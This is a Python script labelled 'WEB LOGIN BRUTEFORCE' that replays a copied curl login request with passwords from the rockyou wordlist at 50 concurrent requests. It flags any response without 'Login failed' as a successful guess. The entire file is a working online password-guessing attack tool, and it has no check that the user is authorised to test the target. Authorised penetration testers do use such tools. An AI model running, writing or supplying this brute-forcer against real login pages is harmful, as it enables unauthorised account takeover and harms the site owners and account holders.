import aiohttp
import asyncio
import argparse
import urllib.parse
import json
import os
import re

"""
v1.1.0
tested in python 3.10.6
pip3 install aiohttp
"""

async def post(session, index, FUZZ, filter, semaphore, url, headers, payload):
    """
    in your browser inspect element, then get the request and copy it as curl.
    then go to https://curlconverter.com/python/

    get the body and the headers, replace the previous below
    """

    # CHECK PAYLOADS
    if headers.get('Content-Type') == 'application/x-www-form-urlencoded':
        data = payload
    if headers.get('Content-Type') == 'application/json':
        data = json.dumps(payload)

    async with semaphore:
        try:
            async with session.post(url, data=data, headers=headers) as response:
                text = await response.text()
                if filter in text:
                    response.status = 401
                    status = 'Failed'
                else:
                    status = 'CHECK THIS!'
                    # print(text)
                    print("\r [!] CHECK THIS ")
                    print(f"FUZZ: {FUZZ}")
                    os._exit(1)  # Exit the program immediately

                print(index, response.status, status, FUZZ, end="\r")
                return response.status
        except Exception as e:
            print(f"[-] Request failed: {e}")
            return None

def read_file_to_array(file_path):
    expanded_path = os.path.expanduser(file_path)
    try:
        with open(expanded_path, 'r', encoding='latin-1') as file:
            lines = file.readlines()
        return [line.strip() for line in lines]
    except Exception as e:
        print(f"Error reading file: {e}")
        return []

def parse_curl_command(file_path):
    with open(file_path, 'r') as file:
        curl_command = file.read().strip()

    # Extract URL
    url_match = re.search(r"curl '([^']*)'", curl_command)
    url = url_match.group(1) if url_match else None

    # Extract headers
    headers = dict(re.findall(r"-H '([^:]*): ([^']*)'", curl_command))

    # Extract data
    data_match = re.search(r"--data-raw '([^']*)'", curl_command)
    raw_data = data_match.group(1) if data_match else None
    decoded_data = urllib.parse.unquote_plus(raw_data)  # Decode URL-encoded form data, converting + to spaces correctly
    data = dict(re.findall(r"([^=&]+)=([^&]*)", decoded_data))

    return url, headers, data


def replace_fuzz_with_password(data, password):
    updated_data = data.copy()
    for key, value in updated_data.items():
        if 'FUZZ' in value:
            updated_data[key] = value.replace('FUZZ', password)
    return updated_data

async def main(url, headers, payload, filter_string):
    file_path = "~/wordlists/rockyou.txt"
    password_list = read_file_to_array(file_path)
    concurrent_limit = 50
    semaphore = asyncio.Semaphore(concurrent_limit)

    tasks = []
    async with aiohttp.ClientSession() as session:
        for i in range(0, len(password_list), concurrent_limit):
            batch = password_list[i:i + concurrent_limit]

            for j, password in enumerate(batch):
                current_payload = replace_fuzz_with_password(data=payload, password=password)
                task = asyncio.ensure_future(post(
                    session=session, index=i + j, FUZZ=password, filter=filter_string, semaphore=semaphore,
                    url=url, headers=headers, payload=current_payload
                ))
                tasks.append(task)

            responses = await asyncio.gather(*tasks)
            tasks = []  # Clear tasks for the next batch


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Parse curl command from a file")
    parser.add_argument("--curl", type=str, help="File path of the curl command file", required=True)
    args = parser.parse_args()

    url, headers, payload = parse_curl_command(args.curl)
    filter_string = "Login failed"
    print("="* 100)
    print("[+] WEB LOGIN BRUTEFORCE")
    print("="* 100)
    print("url:", url)
    print("headers:", json.dumps(headers, indent=4))
    print("payload:", json.dumps(payload, indent=4))
    print("="* 100)
    asyncio.run(main(url, headers, payload, filter_string))
